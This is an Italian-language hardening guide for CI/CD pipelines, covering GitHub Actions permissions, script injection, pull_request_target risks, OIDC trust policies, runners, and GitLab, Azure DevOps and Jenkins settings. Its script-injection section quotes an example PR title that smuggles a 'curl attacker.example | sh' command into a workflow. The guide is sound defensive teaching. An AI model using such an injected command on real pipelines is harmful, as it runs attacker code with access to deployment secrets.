# Pipeline CI/CD — configurazioni di riferimento

La pipeline ha accesso al codice, ai segreti di deploy e alla produzione: va protetta come un sistema di
produzione. I rischi principali sono tre: **injection** da contenuti controllati da esterni (titoli di PR, nomi
di branch, commenti), **action o tool compromessi** e **token con troppi permessi**.

## Indice

1. Workflow GitHub Actions hardened
2. Script injection
3. Eventi pericolosi: `pull_request_target` e `workflow_run`
4. OIDC verso il cloud
5. Runner
6. Cache, artefatti e release
7. Protezione del repository
8. GitLab CI
9. Altri sistemi (Azure DevOps, Jenkins)
10. Strumenti di verifica

## 1. Workflow GitHub Actions hardened

```yaml
name: ci
on:
  pull_request:
  push:
    branches: [main]

permissions: {}                     # nessun permesso di default; ogni job dichiara i suoi

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@<sha-40-caratteri> # vX.Y.Z
        with:
          persist-credentials: false      # il token non resta nella configurazione git
      - run: npm ci --ignore-scripts
      - run: npm test

  deploy:
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    needs: [test]
    runs-on: ubuntu-latest
    timeout-minutes: 30
    environment: production               # reviewer obbligatori e segreti dell'ambiente
    permissions:
      contents: read
      id-token: write                     # solo per lo scambio OIDC con il cloud
    steps:
      - uses: actions/checkout@<sha-40-caratteri> # vX.Y.Z
        with:
          persist-credentials: false
      - uses: aws-actions/configure-aws-credentials@<sha-40-caratteri> # vX.Y.Z
        with:
          role-to-assume: arn:aws:iam::<account-id>:role/gha-payments-api-deploy
          aws-region: eu-south-1
      - run: ./scripts/deploy.sh
```

Per ottenere lo SHA del commit di un tag: `git ls-remote https://github.com/<owner>/<action> 'refs/tags/<tag>*'`.
Con un pattern esatto `refs/tags/<tag>` git non stampa la riga dereferenziata: aggiungi `*` (o usa
`'refs/tags/<tag>^{}'`) e, se il tag è annotato, prendi lo SHA della riga con suffisso `^{}`, che punta al
commit. Lascia a Renovate o Dependabot l'aggiornamento degli SHA.

## 2. Script injection

Le espressioni `${{ … }}` sono sostituite nel testo dello script prima che la shell lo esegua: un titolo di PR
come `"; curl attacker.example | sh; echo "` diventa codice.

```yaml
# Insicuro
- run: echo "Titolo: ${{ github.event.pull_request.title }}"

# Sicuro: il valore passa come variabile d'ambiente e la shell lo tratta come dato
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Titolo: $PR_TITLE"
```

Contesti da considerare controllati da esterni: `github.event.issue.*`, `github.event.pull_request.*`
(titolo, body, label, `head.ref`, `head.label`), `github.event.comment.*`, `github.event.review.*`,
`github.event.head_commit.*`, `github.event.commits.*`, `github.head_ref`, input di `workflow_dispatch` se
il workflow è avviabile da utenti non fidati. Vale anche per lo `script:` di `actions/github-script`.

## 3. Eventi pericolosi: `pull_request_target` e `workflow_run`

- `pull_request_target` gira con i permessi e i segreti del repository di base anche per PR da fork. Non fare
  mai checkout ed esecuzione del codice della PR (`ref: ${{ github.event.pull_request.head.sha }}`) in questi
  workflow. Usalo solo per operazioni che non toccano il codice della PR (es. etichettare).
- Schema sicuro: un workflow `pull_request` senza segreti esegue build e test del codice esterno e produce
  artefatti; un workflow `workflow_run` con permessi elevati li consuma trattandoli come input non fidato
  (nessuna esecuzione, validazione del contenuto).
- `issue_comment` e altri trigger avviabili da chiunque: verifica l'autore (`author_association`) prima di
  azioni privilegiate.

## 4. OIDC verso il cloud

Trust policy del ruolo AWS assunto dalla pipeline (condizioni chiave):

```json
{
  "Effect": "Allow",
  "Principal": { "Federated": "arn:aws:iam::<account-id>:oidc-provider/token.actions.githubusercontent.com" },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:<org>/<repo>:environment:production"
    }
  }
}
```

- Vincola `sub` al repository e all'environment (o al branch protetto); mai `repo:<org>/*` o `StringLike` con
  wildcard ampie.
- Ruoli distinti per build (nessun accesso alla produzione) e deploy (solo le azioni necessarie al deploy).
- Equivalenti: Azure federated credentials su Managed Identity o App Registration con subject
  `repo:<org>/<repo>:environment:production`; GCP Workload Identity Federation con `attribute_condition` su
  `assertion.repository` e `assertion.ref`.

## 5. Runner

- Preferisci runner ospitati effimeri. I runner self-hosted sono effimeri (un job e poi distrutti), isolati in
  rete, senza credenziali persistenti, e mai usati da repository pubblici o da PR di fork.
- Monitoraggio dell'egress dei job critici (es. StepSecurity Harden-Runner in modalità audit poi block) per
  rilevare esfiltrazione da action compromesse.
- `timeout-minutes` su ogni job.

## 6. Cache, artefatti e release

- I workflow di release non ripristinano cache scritte da workflow su PR (cache poisoning).
- Artefatti di build firmati e con attestazione di provenance (`actions/attest-build-provenance`, cosign).
- Le release e i tag sono protetti: solo la pipeline crea release, con approvazione.
- Niente `secrets: inherit` verso workflow riutilizzabili: passa solo i segreti necessari.
- Mai stampare segreti nei log; non usare `set -x` in step che maneggiano segreti; ricorda che il masking dei
  log non copre trasformazioni del valore (base64, sottostringhe).

## 7. Protezione del repository

- Branch protection o ruleset su `main` e branch di release: PR obbligatoria, almeno una review di persona
  diversa dall'autore (due per codice C3 o di pagamento), status check obbligatori (test e security gate),
  niente force push né cancellazione, risoluzione delle conversazioni.
- `CODEOWNERS` per `.github/workflows/`, IaC, policy, configurazioni di sicurezza, con il Security Champion o
  il team piattaforma come owner.
- Permessi di default del `GITHUB_TOKEN` in sola lettura a livello di organizzazione; creazione e approvazione di
  PR da parte di GitHub Actions disabilitata salvo necessità.
- Secret scanning con push protection, Dependabot alerts, code scanning attivi.
- Commit firmati consigliati, obbligatori per i repository critici.

## 8. GitLab CI

- Branch e tag protetti; variabili `protected` e `masked`, disponibili solo su branch protetti.
- Pipeline per merge request da fork senza accesso alle variabili protette.
- `id_tokens` per l'OIDC verso i cloud con `aud` specifico; vincoli su `project_path` e `ref_protected`.
- `CI_JOB_TOKEN` con allowlist dei progetti che possono usarlo.
- `include` di template remoti con `ref:` fissato a uno SHA; immagini dei job per digest.
- Runner specifici per progetto per i deploy di produzione; environment protetti con approvazione.

## 9. Altri sistemi (Azure DevOps, Jenkins)

- Azure DevOps: service connection con workload identity federation, limitate alle pipeline autorizzate;
  approvals and checks sugli environment; template obbligatori (`extends`) per imporre gli step di sicurezza.
- Jenkins: niente credenziali globali usabili da qualunque job; job definiti come codice (Jenkinsfile) da branch
  protetti; agent effimeri; plugin ridotti al minimo e aggiornati; nessun build di PR esterne su agent con
  accesso alla produzione.

## 10. Strumenti di verifica

- `zizmor` (analisi di sicurezza dei workflow GitHub Actions: injection, permessi, pinning, trigger pericolosi).
- `actionlint` (correttezza e parte dei problemi di sicurezza).
- OpenSSF Scorecard (postura complessiva del repository).
- `gitleaks` o `trufflehog` per i segreti, anche sulla cronologia.
